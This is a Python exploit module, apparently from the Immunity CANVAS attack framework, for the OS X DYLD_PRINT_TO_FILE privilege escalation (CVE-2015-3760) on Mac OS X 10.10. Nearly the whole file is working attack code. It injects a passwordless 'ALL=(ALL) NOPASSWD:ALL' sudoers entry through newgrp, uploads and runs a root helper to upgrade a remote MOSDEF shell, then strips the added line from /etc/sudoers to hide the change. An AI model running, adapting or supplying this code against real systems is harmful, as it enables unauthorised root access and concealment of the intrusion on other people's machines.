#!/usr/bin/env python

#Proprietary CANVAS source code - use only under the license agreement
#specified in LICENSE.txt in your CANVAS distribution
#Copyright Immunity, Inc, 2006-2007
#http://www.immunityinc.com/CANVAS/ for more information

import sys
import time
import uuid

from exploitutils import *
from canvaserror import *

from ExploitTypes.osxLocalExploit import osxLocalExploit
from osxNode import osxNode

if '.' not in sys.path:
    sys.path.append('.')

NAME                           = 'OS X DYLD_PRINT_TO_FILE local privilege escalation'
DESCRIPTION                    = 'Elevate MOSDEF Node privileges'
DOCUMENTATION                  = {}
DOCUMENTATION['VENDOR']        = 'Apple'
DOCUMENTATION['Repeatability'] = 'Multiple Times'
DOCUMENTATION['CVE Name']      = 'CVE-2015-3760'
DOCUMENTATION['CVE Url']       = 'https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2015-3760'

VERSION                        = '1.0'
PROPERTY                       = {}
PROPERTY['TYPE']               = 'Exploit'
PROPERTY['SITE']               = 'Local'
PROPERTY['ARCH']               = [ ['Mac OS X'] ]
PROPERTY['VERSION']            = [ '10.10' ]

DOCUMENTATION['Notes']         = """

Tested on:
- 10.10.3

"""

class theexploit(osxLocalExploit):
    def __init__(self):
        osxLocalExploit.__init__(self)
        self.name               = NAME
        self.node               = None
        self.local_res          = os.path.join(os.path.dirname(__file__), 'Resources')
        self.remote_exp         = '/tmp/x'
        self.remote_helper      = '/tmp/h'

    def read_file(self, path):
        fd = self.node.shell.open(path, self.node.shell.libc.getdefine('O_RDONLY'))
        if fd < 0:
            self.log_error("Error while opening (%s)" % path)
            return None

        ret, st = self.node.shell.fstat(fd)
        if ret != 0:
            self.log_error("Error on fstat (%s)" % path)
            return None

        sz = st['st_size']
        buf = self.node.shell.readfromfd(fd, sz)
        self.node.shell.close(fd)

        return buf

    def write_file(self, path, data):
        O_RDWR  = self.node.shell.libc.getdefine('O_RDWR')
        O_CREAT = self.node.shell.libc.getdefine('O_CREAT')
        fd = self.node.shell.open(path, O_RDWR | O_CREAT)
        if fd < 0:
            self.log_error("Error while creating (%s)" % path)
            return None

        sz = len(data)

        self.node.shell.writetofd(fd, data)
        self.node.shell.close(fd)

    def exec_exploit(self, command = None):
        lvars = {}
        # Look at you going Apple
        lvars['X_CMD'] = "echo 'echo \"$(whoami) ALL=(ALL) NOPASSWD:ALL\" >&4' | DYLD_PRINT_TO_FILE=/etc/sudoers newgrp; sudo %s" % self.remote_helper

        code = """
        #import "string", "X_CMD" as "X_CMD"

        #import "%s", "execl" as "execl"
        #import "local", "sendint" as "sendint"
        #import "local", "fork" as "fork"
        #import "local", "exit" as "exit"
        #import "local", "waitpid" as "waitpid"

        void
        main()
        {
            int pid;
            char *x_cmd;
            x_cmd = X_CMD;

            pid = fork();
            if (pid == 0) {
                execl("/bin/sh", "sh", "-c", x_cmd, NULL);
                exit(-1);
            }

            waitpid(pid, 0, 0);
            sendint(0);
        }
        """ % ("remote64" if hasattr(self.node.shell, "LP64") and self.node.shell.LP64 else "remote")

        ret = self.node.shell.runCode(code, lvars)
        return ret

    def run(self):
        for node in self.argsDict['passednodes']:
            self.node = node
            self.setInfo("%s (in progress on node %s)" % (self.name, self.node))

            if self.node.shell is None:
                self.log_error("Node has no shell server available")
                self.log_error("Bailing")
                self.setInfo("%s Bailing (Node has no shell server available)" % (self.name))
                continue

            if not self.is_osx_node():
                continue

            if self.compromised(self.remote_helper, 0):
                self.nlog('Already compromised')
                self.nlog('Initing elevated MOSDEF loop')
                self.fork_and_exec(self.remote_helper, wait = 1)
                self.nlog('Done')
                self.cleanup()
                self.setInfo("%s Done (Success)" % (self.name))
                self.setProgress(100)
                continue

            self.log_info('Uploading helper')
            if self.nodeUpload(self.local_helper_64, self.remote_helper) == False:
                self.setInfo("%s Done (Failed to upload helper)" % (self.name))
                continue
            self.setProgress(60)

            self.nlog('Executing exploit')

            self.exec_exploit()
            self.nlog('Waiting...')

            self.setProgress(90)

            # wait 3 secs for the exploit to complete
            wait_secs = 3
            if self.compromised(self.remote_helper, wait_secs):
                self.log_info('Compromised!')
                self.nlog('Upgrading MOSDEF connection loop')
                self.fork_and_exec(self.remote_helper, wait = 1)

                self.nlog("Cleaning up /etc/sudoers")
                # cleanup /etc/sudoers
                tmp_file_1 = os.path.join("/tmp/", uuid.uuid4().hex)
                tmp_file_2 = os.path.join("/tmp/", uuid.uuid4().hex)

                self.node.runcommand("sudo /bin/cp /etc/sudoers %s" % tmp_file_1)
                self.node.runcommand("sudo /bin/chmod 446 %s" % tmp_file_1)

                l = self.read_file(tmp_file_1)
                z = l.split("\n")
                del z[len(z) - 2]
                l = '\n'.join(z)

                self.node.runcommand("sudo /bin/rm %s" % tmp_file_1)

                self.write_file(tmp_file_2, l)
                a = self.node.runcommand("sudo /bin/cp %s /etc/sudoers" % tmp_file_2)
                self.nodeDeleteFile(tmp_file_2)

                self.nlog('Done')
                self.setInfo("%s Done (Success)" % (self.name))
            else:
                self.log_error('Looks like we failed, try again!')
                self.setInfo("%s Done (Failed)" % (self.name))
                self.setProgress(-1)

            self.cleanup()

        return 1


if __name__ == '__main__':
    print "Running CANVAS %s Exploit v%s" % (DESCRIPTION, VERSION)
    app = theexploit()
    ret = standard_callback_commandline(app)
